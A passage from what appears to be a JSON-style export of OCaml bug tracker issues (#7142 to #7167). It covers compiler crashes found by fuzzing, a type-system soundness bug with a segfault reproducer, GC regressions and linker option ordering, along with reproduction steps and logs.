attachments\n\n- [bug.ml](https://gist.githubusercontent.com/vicuna/9dda62cd27d93abe5a15c8bbc35c6680/raw/ab45fc891faf1a0c856dee860e044464b56ed1e5/bug.ml)\n"},{"labels":["bug"],"text":"**Original bug ID:** 7167\n**Reporter:** @kayceesrk\n**Status:** closed (set by @mshinwell on 2016-12-07T15:50:34Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Target version:** 4.03.1+dev\n**Category:** ~DO NOT USE (was: OCaml general)\n**Tags:** afl\n**Monitored by:** @kayceesrk @gasche\n\n## Bug description\n\nAnother crash found with afl-instrumented ocamlopt.opt (See #7165).\n\n## Steps to reproduce\n\n$ ocamlopt.opt crash_22909_40.ml \r\nFile \"/tmp/afl_crashes/crash_22909_40.ml\", line 28, characters 11-12:\r\nWarning 20: this argument will not be used by the function.\r\nFile \"/tmp/afl_crashes/crash_22909_40.ml\", line 29, characters 11-17:\r\nWarning 20: this argument will not be used by the function.\r\nFile \"/tmp/afl_crashes/crash_22909_40.ml\", line 29, characters 16-17:\r\nWarning 20: this argument will not be used by the function.\r\nFile \"/tmp/afl_crashes/crash_22909_40.ml\", line 30, characters 11-17:\r\nWarning 20: this argument will not be used by the function.\r\nFile \"/tmp/afl_crashes/crash_22909_40.ml\", line 30, characters 16-17:\r\nWarning 20: this argument will not be used by the function.\r\nFile \"/tmp/afl_crashes/crash_22909_40.ml\", line 31, characters 11-22:\r\nWarning 20: this argument will not be used by the function.\r\nFile \"/tmp/afl_crashes/crash_22909_40.ml\", line 31, characters 16-22:\r\nWarning 20: this argument will not be used by the function.\r\nFile \"/tmp/afl_crashes/crash_22909_40.ml\", line 31, characters 21-22:\r\nWarning 20: this argument will not be used by the function.\r\nFile \"/tmp/afl_crashes/crash_22909_40.ml\", line 32, characters 15-44:\r\nWarning 20: this argument will not be used by the function.\r\nFile \"/tmp/afl_crashes/crash_22909_40.ml\", line 32, characters 20-44:\r\nWarning 20: this argument will not be used by the function.\r\nFile \"/tmp/afl_crashes/crash_22909_40.ml\", line 32, characters 25-44:\r\nWarning 20: this argument will not be used by the function.\r\nFile \"/tmp/afl_crashes/crash_22909_40.ml\", line 32, characters 34-44:\r\nWarning 20: this argument will not be used by the function.\r\nFile \"/tmp/afl_crashes/crash_22909_40.ml\", line 32, characters 43-44:\r\nWarning 20: this argument will not be used by the function.\r\n>> Fatal error: Cmmgen.transl_prim_1\r\nFatal error: exception Misc.Fatal_error\n\n## File attachments\n\n- [crash_22909_40.ml](https://gist.githubusercontent.com/vicuna/2c7ba9c4431ada992b56e76ea9160403/raw/441031a20bef78b643a41be89dd41d1fb5ce8148/crash_22909_40.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7166\n**Reporter:** @kayceesrk\n**Status:** closed (set by @mshinwell on 2016-12-07T16:49:28Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** major\n**Version:** 4.02.3\n**Target version:** 4.03.1+dev\n**Category:** typing\n**Tags:** afl\n**Monitored by:** @gasche\n\n## Bug description\n\nAnother bug found with afl-instrumented ocamlopt.opt (See #7165). The compilation fails with `Fatal error: exception Stack overflow`.\n\n## Steps to reproduce\n\n$ ocamlopt.opt crash_22909_21.ml\r\nFatal error: exception Stack overflow\n\n## File attachments\n\n- [crash_22909_21.ml](https://gist.githubusercontent.com/vicuna/7566d1d9d878cfe1fd7d92b2a957c5f7/raw/679bd95699714a9e8d7c28924d645904541e9f0c/crash_22909_21.ml)\n"},{"labels":["bug"],"text":"**Original bug ID:** 7165\n**Reporter:** @kayceesrk\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:08Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Target version:** 4.03.1+dev\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** ~DO NOT USE (was: OCaml general)\n**Tags:** afl\n**Monitored by:** @kayceesrk @gasche\n\n## Bug description\n\nocamlc and ocamlopt crash with `Fatal error: exception Failure(\"int_of_string\")` if the input file just contains `#9342101923012312312`. The `int_of_string` call at [0] fails due to overflow. \r\nThe failing test case was generated with afl instrumented OCaml [1].\r\n\r\n[0] https://github.com/ocaml/ocaml/blob/5401ce8473062b19dd3553d022593cc5d91ccbff/lex/lexer.mll#L130\r\n[1] https://github.com/ocamllabs/opam-repo-dev/pull/23\n\n## Steps to reproduce\n\n$ cat crash.ml \r\n#9342101923012312312\r\n$ ocamlc crash.ml \r\nFatal error: exception Failure(\"int_of_string\")\n\n## File attachments\n\n- [crash.ml](https://gist.githubusercontent.com/vicuna/a3c358fef33801067705495d8af3f5c1/raw/188cbc7e27a4ae1d168e3638f9488a0f7b8bb48f/crash.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7164\n**Reporter:** @sliquister\n**Status:** resolved (set by @xavierleroy on 2017-10-15T14:18:59Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Category:** configure and build/install\n**Related to:** #6735\n**Monitored by:** @gasche @diml\n\n## Bug description\n\nI was trying to pass --as-needed to link exes, but when ocamlc links bytecode exes with -custom, it doesn't pass -ltinfo despite depending on it (which I suppose is wrong?), resulting in the failure below.\r\nIf I add -ltinfo to Config.bytecomp_c_libraries, it fixes the problem.\n\n## Steps to reproduce\n\n$ touch a.ml; ocamlc -verbose a.ml -ccopt -Wl,--as-needed -custom -o a\r\n+ gcc -o 'a'   '-L$DIR/lib/ocaml' -Wl,--as-needed '/tmp/camlprim9cc349.c' '-lcamlrun' -I'/j/office/app/ocaml/builds/4.02.3+gc-2+j2-cent6_20151110_095047GMT/lib/ocaml' -lrt -lm  -ldl -lcurses -lpthread\r\n$DIR/lib/ocaml/libcamlrun.a(terminfo.o): In function `caml_terminfo_resume':\r\nterminfo.c:(.text+0x27): undefined reference to `tputs'\r\n$DIR/lib/ocaml/libcamlrun.a(terminfo.o): In function `caml_terminfo_standout':\r\nterminfo.c:(.text+0x61): undefined reference to `tputs'\r\n$DIR/lib/ocaml/libcamlrun.a(terminfo.o): In function `caml_terminfo_backup':\r\nterminfo.c:(.text+0x96): undefined reference to `tputs'\r\n$DIR/lib/ocaml/libcamlrun.a(terminfo.o): In function `caml_terminfo_setup':\r\nterminfo.c:(.text+0x10a): undefined reference to `tgetent'\r\nterminfo.c:(.text+0x11d): undefined reference to `tgetnum'\r\nterminfo.c:(.text+0x132): undefined reference to `tgetstr'\r\nterminfo.c:(.text+0x148): undefined reference to `tgetstr'\r\nterminfo.c:(.text+0x15e): undefined reference to `tgetstr'\r\nterminfo.c:(.text+0x174): undefined reference to `tgetstr'\r\nterminfo.c:(.text+0x199): undefined reference to `tgetstr'\r\n$DIR/lib/ocaml/libcamlrun.a(terminfo.o):terminfo.c:(.text+0x1af): more undefined references to `tgetstr' follow\r\ncollect2: ld returned 1 exit status\r\nFile \"a.ml\", line 1:\r\nError: Error while building custom runtime system\n"},{"labels":["bug"],"text":"**Original bug ID:** 7162\n**Reporter:** maro\n**Assigned to:** @garrigue\n**Status:** closed (set by @damiendoligez on 2016-03-24T15:47:36Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**OS:** Linux\n**OS Version:** Ubuntu 14.04\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Related to:** #7161\n**Monitored by:** @diml bobot @Yakobowski\n\n## Bug description\n\nThe Frama-C GUI, based on lablgtk, currently crashes when compiled with OCaml 4.03+beta1: a segmentation fault is produced in the Gtk code.\r\n\r\nHere's the end of the backtrace:\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\ngtk_tree_view_row_inserted (model=0x160ae60, path=0x1561a40, iter=0x15ca020, data=0x12d1270) at /build/gtk+2.0-KsZSEA/gtk+2.0-2.24.23/gtk/gtktreeview.c:8464\r\n8464    /build/gtk+2.0-KsZSEA/gtk+2.0-2.24.23/gtk/gtktreeview.c: No such file or directory.\r\n(gdb) bt\r\n#0  gtk_tree_view_row_inserted (model=0x160ae60, path=0x1561a40, iter=0x15ca020, data=0x12d1270) at /build/gtk+2.0-KsZSEA/gtk+2.0-2.24.23/gtk/gtktreeview.c:8464\r\n#1  0x00007ffff72f33b8 in g_closure_invoke () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0\r\n#2  0x00007ffff7304d3d in ?? () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0\r\n#3  0x00007ffff730ca29 in g_signal_emit_valist () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0\r\n#4  0x00007ffff730cce2 in g_signal_emit () from /usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0\r\n#5  0x0000000000b15a8a in ml_custom_model_row_inserted (tree_model_val=<optimized out>, path=140737220365248, row=140737220365296) at ml_gtktree.c:1517\r\n#6  0x00000000009fd42f in camlGTree__fun_8134 ()\r\n#7  0x0000000000aad5b5 in camlList__iter_1258 () at list.ml:77\r\n#8  0x0000000000638687 in camlDesign__display_warnings_33195 () at src/plugins/gui/design.ml:1428\r\n....\r\n\r\nThe last line is part of the Frama-C code.\r\n\r\nI believe there might be several different factors contributing to this bug, but so far, after a manual bisection, I ended up at commit 8851e6b7 (Allow allocating custom blocks with finalizers in the minor heap.). The preceding commit (ceb5e0baa) does not crash.\r\n\r\nI still don't know if the following is related, but when testing my program using ceb5e0baa or 8851e6b7, on longer runs, the following messages are produced in the console:\r\n\r\n[ocaml] (use Sys.enable_runtime_warnings to control these warnings)\r\n[ocaml] channel opened on file '/tmp/cppannot31a858.c' dies without being closed\r\n[ocaml] channel opened on file '/tmp/cppannot11320f.c' dies without being closed\r\n\r\nI had never seen these messages before, and they likely appear with several other commits. The named files are temporary files produced by Frama-C, which indicates that there might also be a bug in our code base. In the end, I think that there is an influence of several previously unnoticed bugs.\n\n## Steps to reproduce\n\n- Compile the OCaml code corresponding to commit 8851e6b7;\r\n- Use it to compile Frama-C dependencies (especially lablgtk);\r\n- Download, compile and install the latest public release of Frama-C (Magnesium);\r\n- Create a \"test.c\" file containing a single line:\r\n\r\n  int i = 1.1;\r\n\r\n- Run \"frama-c-gui test.c\". The program should crash almost instantly with the segmentation fault described above.\r\n\r\nNote: it seems that it is not possible to install lablgtk directly from the stable versions of camlp4, so I preprocessed the lablgtk files and removed the camlp4 dependence. With the attached archive (which includes a \"opam\" file), it should be possible to locally do a `opam pin` on the lablgtk package and install the remaining Frama-C dependencies from opam.\r\n\r\nI'll later try to add the (approximate) sequence of commands necessary to reproduce the entire installation.\n\n## File attachments\n\n- [alloc_custom.diff](https://gist.githubusercontent.com/vicuna/a89156b7e41c11846e2f000f3595ba21/raw/65dd4ff67b119ce5fa1617f98f5111822e3517ee/alloc_custom.diff)\n- [lablgtk-2.18.3-preprocessed.tar.gz](https://gist.githubusercontent.com/vicuna/a89156b7e41c11846e2f000f3595ba21/raw/51409d9942b6f181d0b805a04671eddc8cc3292b/lablgtk-2.18.3-preprocessed.tar.gz)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7161\n**Reporter:** maro\n**Status:** closed (set by @damiendoligez on 2016-03-24T15:45:14Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**OS:** Linux\n**Version:** 4.03.0+dev / +beta1\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** runtime system and C interface\n**Related to:** #7157 #7162\n**Monitored by:** bobot @hcarty @Yakobowski\n\n## Bug description\n\nIn Frama-C, we have some case studies where ephemerons lead to an assertion failure in one of our data structures, which is based on weak hash tables (Hptmap).\r\n\r\nThis happens with OCaml 4.03+beta1. After investigating via a manual git bisect, I arrived at the following commit:\r\n\r\ne33599880d087c - [GC] make ephemerons more efficient\r\n\r\n(Note that this commit by itself does not compile; for commits between 03ed6a0f5169304f and ec173d03d6760920, I needed to cherry-pick commit 3a470635e9e2694d1 in order to be able to compile them.)\r\n\r\nUntil the previous commit (ff8c0c83c2f10e), everything works as usual. After e33599880d087c, a few case studies trigger an assertion that should never be triggered.\r\n\r\nThis report is mainly for notification purposes; we will discuss directly with FranÃ§ois when he will be back to investigate the cause.\n\n## Steps to reproduce\n\nOur case studies are based on open-source code, but require some complex settings; we can describe the required steps if needed, but initially it may be simpler to see it directly with FranÃ§ois.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7160\n**Reporter:** mandrykin\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:01Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** crash\n**Platform:** x86_64\n**OS:** Linux 3.19.0\n**OS Version:** Ubuntu 15.04\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** typing\n**Monitored by:** @hcarty\n\n## Bug description\n\nThe attached example shows how type defining a type synonym with an incompatible  manifest can actually change the previous definition instead of being rejected. This can potentially lead to segmentation faults when ill-typed programs are accepted.\n\n## Steps to reproduce\n\n# ocaml\r\n(*         OCaml version 4.03.0+beta1*)\r\ntype 'a any = [< `A | `B] as 'a;;\r\n(* type 'a any = 'a constraint 'a = [< `A | `B ] *)\r\ntype _ t = X : int -> [`A] t | Y : string -> [`B] t | C : (_ any as 'l) t -> 'l t;;\r\n(* type _ t =\r\n    X : int -> [ `A ] t\r\n  | Y : string -> [ `B ] t\r\n  | C : 'a any t -> ([< `A | `B ] as 'a) any t *)\r\nlet rec f = function Y s -> s | C y -> f y;;\r\n(* val f : [ `B ] any t -> string = <fun> *)\r\nf (Y \"5\");;\r\n(* - : string = \"5\" *)\r\nf (C (Y \"5\"));;\r\n(* - : string = \"5\" *)\r\nf (X 5);;\r\n(* Error: This expression has type [ `A ] t\r\n       but an expression was expected of type [ `B ] any t\r\n       Type [ `A ] is not compatible with type [ `B ] any = [ `B ] \r\n       These two variant types have no intersection *)\r\nf (C (X 5));;\r\n(* Error: This expression has type [ `A ] t\r\n       but an expression was expected of type [ `B ] any any t\r\n       Type [ `A ] is not compatible with type [ `B ] any any = [ `B ] \r\n       These two variant types have no intersection *)\r\n(* Until now everything is OK *)\r\ntype 'a tt = 'a t = X : int -> [`A] tt | Y : string -> [`B] tt | C : [< `A | `B] t -> [< `A | `B] tt;;\r\n(* type 'a tt =\r\n  'a t =\r\n    X : int -> [ `A ] tt\r\n  | Y : string -> [ `B ] tt\r\n  | C : [< `A | `B ] t -> [< `A | `B ] tt *)\r\n(* This type synonym definition is accepted though its constraints for the C constructor are different (no equality previously expressed with variable 'l) *)\r\n(* Now even the definition of type _ t itself is changed *)\r\nf (Y \"5\");;\r\n(* - : string = \"5\" *)\r\nf (C (Y \"5\"));;\r\n(* - : string = \"5\" *)\r\nf (X 5);;\r\n(* Error: This expression has type [ `A ] tt = [ `A ] t\r\n       but an expression was expected of type [ `B ] any t\r\n       Type [ `A ] is not compatible with type [ `B ] any = [ `B ] \r\n       These two variant types have no intersection *)\r\n(* The following should not be accepted *)\r\nf (C (X 5));;\r\nSegmentation fault (core dumped)\n\n## File attachments\n\n- [incorrect_weakening2.ml](https://gist.githubusercontent.com/vicuna/2805d139fa377a3fc7d16d5d55d49109/raw/fd908a313f88f65bc0d375d66020c23d6783b076/incorrect_weakening2.ml)\n- [incorrect_weakening_through_manifest.ml](https://gist.githubusercontent.com/vicuna/2805d139fa377a3fc7d16d5d55d49109/raw/e8ccfed35fccad43bfd0421e623a34aab4d17563/incorrect_weakening_through_manifest.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7158\n**Reporter:** mfp\n**Status:** resolved (set by @xavierleroy on 2017-02-16T13:12:43Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.02.3\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** otherlibs\n**Related to:** #7100 #7198 #7750\n**Monitored by:** braibant @gasche @diml @hcarty\n\n## Bug description\n\nEvent.sync uses condition variables, which are represented with custom blocks. \r\n\r\nThe parameters to alloc_custom are used=1, max=Max_condition_number=5000 (raised in 2010 from the original 1000 set back in 1996).\r\n\r\nThe end result is that a full major GC cycle is completed after at most 5000 calls to Event.sync, which can represent a considerable GC load. This is triggered for example by Lwt_preemptive.\n\n## Additional information\n\nReferences: \r\nhttps://github.com/ocsigen/lwt/issues/218\r\nhttps://github.com/mfp/ocaml-sqlexpr/issues/13\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7157\n**Reporter:** AltGr\n**Status:** closed (set by @damiendoligez on 2016-03-03T12:48:38Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** major\n**Platform:** amd64\n**OS:** Linux\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** runtime system and C interface\n**Related to:** #7161\n**Monitored by:** bobot\n\n## Bug description\n\nWe have a bench on which it seems merging the Ephemerons branch may have had large effects (judging by the date when the slowdown appeared, I might be wrong)\r\n\r\nhttp://bench.flambda.ocamlpro.com/graph?bench=numal-fft\r\n\r\nThe code is at https://github.com/AltGr/ocaml-numerical-analysis/blob/bench/fft/bench.ml ; may it be caused by the Gc.set ?\r\n\r\nHere is a more detailed view of the comparison between Jan. 26th and Jan. 27th versions:\r\n\r\nhttp://bench.flambda.ocamlpro.com/compare?test=2016-01-27-2300%2Ftrunk%2Bbench&reference=2016-01-26-2300%2Ftrunk%2Bbench\r\n\r\nWe get +60% time, +245% major words on this bench.\r\n\r\n\r\nOriginally reported at https://github.com/ocaml/ocaml/pull/22#issuecomment-187488450\n\n## File attachments\n\n- [fix_7157.diff](https://gist.githubusercontent.com/vicuna/2569dec6b95446177a407a6c9c4190ef/raw/dec9781cd44cf726cb3185cb28c4b3009bf53523/fix_7157.diff)\n- [perf.svg](https://gist.githubusercontent.com/vicuna/2569dec6b95446177a407a6c9c4190ef/raw/5dfc8a08745030e3dbc6410745401e982672f944/perf.svg)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7156\n**Reporter:** @mjambon\n**Assigned to:** @diml\n**Status:** assigned (set by @mshinwell on 2016-12-08T14:08:42Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Category:** toplevel\n**Tags:** junior_job\n**Monitored by:** mfp @diml @hcarty\n\n## Bug description\n\nUncaught exceptions reported by the ocaml toplevel are printed as if no custom printer was registered. Programs compiled with ocamlc or ocamlopt behave as desired and consult the custom printers to print uncaught exceptions.\r\n\r\n<pre>\r\nmartin@mj2 ~/tmp $ echo > .ocamlinit\r\nmartin@mj2 ~/tmp $ ocaml\r\n        OCaml version 4.02.3\r\n\r\n# Printexc.register_printer (fun e -> Some \"yo\");;\r\n- : unit = ()\r\n# raise Exit;;\r\nException: Pervasives.Exit.\r\n# \r\n</pre>\r\n\r\nWhen compiled with ocamlc or ocamlopt however, the exception is printed using the custom printers:\r\n\r\n<pre>\r\nmartin@mj2 ~/tmp $ cat toto.ml\r\nPrintexc.register_printer (fun e -> Some \"yo\");;\r\nraise Exit;;\r\nmartin@mj2 ~/tmp $ ocamlc -c toto.ml\r\nmartin@mj2 ~/tmp $ ./toto\r\nFatal error: exception yo\r\n</pre>\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7154\n**Reporter:** nore\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:31:52Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.01.0\n**Category:** typing\n**Monitored by:** @Drup @gasche @yallop\n\n## Bug description\n\nDefining type 'a t to be ('a -> int) -> int, in which type 'a is covariant, applying the identity function on an object of type 'a t gives an object of type '_a t. However, if the definition of type 'a t is hidden in a module, with the signature showing 'a to be covariant in t, then the result is of type 'a t. Thus, hiding the definition of the type makes a *more general* type to be inferred.\n\n## Steps to reproduce\n\n# let id r = r;;\r\nval id : 'a -> 'a = <fun>\r\n# type 'a t = ('a -> int) -> int;;\r\ntype 'a t = ('a -> int) -> int\r\n# let u : 'a t = fun x -> 0;;\r\nval u : 'a t = <fun>\r\n# id u;;\r\n- : '_a t = <fun>\r\n# module X : sig type +'a t val u : 'a t end = struct type 'a t = ('a -> int) -> int let u x = assert false end;;\r\nmodule X : sig type +'a t val u : 'a t end\r\n# id X.u;;\r\n- : 'a X.t = <abstr>\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7153\n**Reporter:** mwm\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:02Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** tweak\n**Version:** 4.02.3\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** otherlibs\n\n## Bug description\n\nWhile the Unix library exports the SOCK_SEQPACKET connction type, it fails to export anything allowing it to be used. In particular, the message flag MSG_EOR (used to mark and detect the end of a packet) isn't there. Worse yet, there's apparently no API for reading from a socket that lets you check the message flags for MSG_EOR (or I couldn't find it, in which case the documentation might be improved).\r\n\r\nGiven that the SEQPACKET connection type isn't widely implemented, and may only be supported for odd protocol families, possibly the best solution is to simply remove it.\n\n## Steps to reproduce\n\nRead the documentation on the Unix library.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7152\n**Reporter:** bobot\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:20Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** typing\n**Related to:** #6752 #7313\n**Monitored by:** @hcarty\n\n## Bug description\n\nThe file variable.ml compile with 4.02.3 but not with 4.02.3.\r\n\r\n```\r\nocamlc -o /tmp/dumb -c variable.ml\r\nFile \"variable.ml\", line 5, characters 6-667:\r\nError: Signature mismatch:\r\n       ...\r\n       Values do not match:\r\n         val add_dec : dec:Data.t -> unit\r\n       is not included in\r\n         val add_dec : dec:make_dec -> unit\r\n       File \"src/variable.ml\", line 3, characters 2-35: Expected declaration\r\n       File \"src/variable.ml\", line 63, characters 4-11: Actual declaration\r\n```\r\n\r\nI'm not able to minimize it more (except in fact the label can be removed...).\n\n## File attachments\n\n- [variable.ml](https://gist.githubusercontent.com/vicuna/75d473ec1f831788d011bffa02adf01f/raw/a9f8e50880c262716ee0348ccc26c51374590a53/variable.ml)\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7150\n**Reporter:** @yallop\n**Assigned to:** @chambart\n**Status:** assigned (set by @chambart on 2017-06-02T10:13:45Z)\n**Resolution:** reopened\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.03.1+dev\n**Category:** compiler driver\n**Related to:** #5441\n**Monitored by:** @Drup @diml @ygrek @hcarty\n\n## Bug description\n\nHere's a demonstration of unhelpful reordering behaviour involving options passed through by ocamlopt to the linker.\r\n\r\nFirst, let's compile a couple of modules:\r\n\r\n    $ ocamlopt -c a.ml b.ml\r\n\r\nNext, we'll build a library from one of the modules with some linker options, passed via -cclib:\r\n\r\n    $ ocamlopt -a -o liba.cmxa a.cmx -cclib -L/usr/adir/lib -cclib -L/usr/adir2/lib\r\n\r\nFinally, we'll build an executable from the library and the other module, passing some more linker options:\r\n\r\n    $ ocamlopt -verbose -o b.native b.cmx -cclib -L/usr/lib/bdir/ -cclib -v liba.cmxa -cclib -L/usr/bdir2/lib \r\n\r\nHere's the linker invocation from the last step:\r\n\r\n    gcc -o 'b.native'   '-L/home/jeremy/.opam/4.02.3/lib/ocaml'  '/tmp/camlstartup7c51ee.o' '/home/jeremy/.opam/4.02.3/lib/ocaml/std_exit.o' 'liba.a' 'b.o' '/home/jeremy/.opam/4.02.3/lib/ocaml/stdlib.a' '-L/usr/adir/lib' '-L/usr/adir2/lib' '-L/usr/lib/bdir/' '-v' '-L/usr/bdir2/lib' '/home/jeremy/.opam/4.02.3/lib/ocaml/libasmrun.a' -lm  -ldl\r\n\r\nIn particular, note the order of the linker options\r\n\r\n    '-L/usr/adir/lib' '-L/usr/adir2/lib' '-L/usr/lib/bdir/' '-v' '-L/usr/bdir2/lib'\r\n\r\nAlthough liba.cmxa appeared between -L/usr/lib/bdir and -L/usr/bdir2/lib in the ocamlopt command line, in the gcc command line the options embedded in liba.cmxa have all been moved to the beginning of the line.\r\n\r\nMoving the options in this way is a problem because the order of -L options is significant.  Moving cmxa-embedded options to the beginning of the line results in those options taking precedence over whatever's specified on the command-line.  On my system, for example, the lwt-unix.cmxa library embeds -L/usr/lib, which then appears at the beginning of the library search path.  As a result system libraries are chosen before user-installed libraries, which is not usually the desired behaviour.\n"},{"labels":[null,"bug",null,null],"text":"**Original bug ID:** 7148\r\n**Reporter:** @dbuenzli\r\n**Status:** acknowledged (set by @damiendoligez on 2017-04-13T11:21:39Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.02.3\r\n**Target version:** later\r\n**Category:** lexing and parsing\r\n**Child of:** #5068\r\n**Monitored by:** @diml @hcarty\r\n\r\n## Bug description\r\n\r\nI find the following quite confusing \r\n\r\n```ocaml\r\n ocaml\r\n        OCaml version 4.02.3                                                                                                                                    \r\n# f bla:i;;\r\nError: Syntax error\r\n# (f bla:i);;\r\nError: Unbound type constructor i\r\n```\r\n\r\nThe error came up while forgetting to add the ~ to a labelled argument.\r\n"},{"labels":["bug"],"text":"**Original bug ID:** 7147\n**Reporter:** @Drup\n**Assigned to:** @diml\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:10Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** text\n**Target version:** 4.03.1+dev\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @Drup @gasche @diml @hcarty\n\n## Bug description\n\nThe errors introduced by the extension point [%ocaml.error \"foo\"] are not as pretty as the other errors. They don't have a colored `Error:` prefix.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7146\n**Reporter:** @Octachron\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:52Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** tweak\n**Target version:** 4.03.1+dev\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** documentation\n\n## Bug description\n\nCurrently, the manual tools and examples are build using the system ocaml\r\ninstallation. This can lead to subtle bugs in the manual examples when the\r\nsystem and in-tree compiler are out-of-sync: in particular, uses of newly deprecated function become harder to spot.\r\n\r\nFor the specific case of the in-manual examples, it is relatively easy to fix the problem by modifying the manual's makefiles. However, it might make sense to factorize this work with the test subtree which has already solved the very same issues.\r\n\r\nUnfortunately, I am not sure how to do that in a portable way.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7144\n**Reporter:** @Drup\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2017-03-14T07:04:11Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Target version:** undecided\n**Category:** typing\n**Monitored by:** @Drup @hcarty\n\n## Bug description\n\nI have been able to trigger a non-sensical \"undefined global\" error on trunk with the following setup: \r\n\r\nIn a file A, I have a module alias\r\nmodule P = Parsetree\r\nwhich is the only direct dependency from A to Parsetree (all uses are from the module alias).\r\nIn a file B, I have a dependency to A and a transitive or direct dependency to Parsetree, but without any alias.\r\n\r\nI get the error \r\nError: Error while linking foo.cma(A):\r\nReference to undefined global `Parsetree'\r\n\r\n\r\nI have not been able to create a minimal example but I have an easily reproducible test case:\r\n\r\nGiven a freshly compiled trunk source tree\r\nIf you add \"let _f x = Parsetree.Pexp_ident x\" at the top of typing/ident.ml\r\n\"make depend && make world\" and it works\r\nIf you add \"module P = Parsetree\" the same steps don't work.\r\n\r\nPlaying with .depend doesn't help. I have also another project using compiler-libs that exhibits the issue.\n"},{"labels":["bug"],"text":"**Original bug ID:** 7142\r\n**Reporter:** @mlasson\r\n**Assigned to:** @alainfrisch\r\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:09Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Target version:** 4.03.1+dev\r\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\r\n**Category:** ~DO NOT USE (was: OCaml general)\r\n**Monitored by:** @gasche @ygrek @jmeber @hcarty\r\n\r\n## Bug description\r\n\r\nThe program in Section \"Steps to Reproduce\" used to work in ocaml 4.01 and fails with the exception \"input_value: truncated object\" on the current trunk.\r\n\r\nIt is due to the recent change in intern.c, more precisely the merge of #224 [https://github.com/ocaml/ocaml/pull/224] (commit 4fd254e).\r\n\r\nBefore that commit, the function caml_input_val was raising the EOF exception while trying to read the magic number starting marshaled representation, and now the function call below fails with \"input_value: truncated object\" (is the object really truncated if there is no object ?):\r\nif (caml_really_getblock(chan, header, 20) == 0) {\r\n   caml_failwith(\"input_value: truncated object\");\r\n}\r\n\r\nI don't know if this is a bug or if the original behavior was an abuse the demarshaling function. In the later case, it should be documented.\r\n\r\n## Steps to reproduce\r\n\r\nlet write oc n =\r\n  for k = 1 to n do\r\n     Marshal.to_channel oc k []\r\n  done\r\n\r\nlet read ic =\r\n  try while true do\r\n    Printf.printf \"%d\\n%!\" (Marshal.from_channel ic)\r\n  done with End_of_file -> ()\r\n\r\nlet () = begin\r\n    let filename, oc = Filename.open_temp_file ~mode:[Open_binary] \"integers\" \"tmp\" in\r\n    write oc 10;\r\n    close_out oc;\r\n    let ic = open_in_bin filename in\r\n    read ic;\r\n    close_in ic;\r\n  end\r\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 